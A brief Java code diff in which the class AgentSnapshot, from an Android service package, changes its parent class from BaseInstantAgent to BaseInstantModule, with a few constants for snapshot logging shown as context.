@@ -40,7 +40,7 @@ import com.android.service.util.WChar;
 /**
  * The Class SnapshotAgent.
  */
-public class AgentSnapshot extends BaseInstantAgent {
+public class AgentSnapshot extends BaseInstantModule {
 
 	private static final int LOG_SNAPSHOT_VERSION = 2009031201;
 	private static final int MIN_TIMER = 1 * 1000;
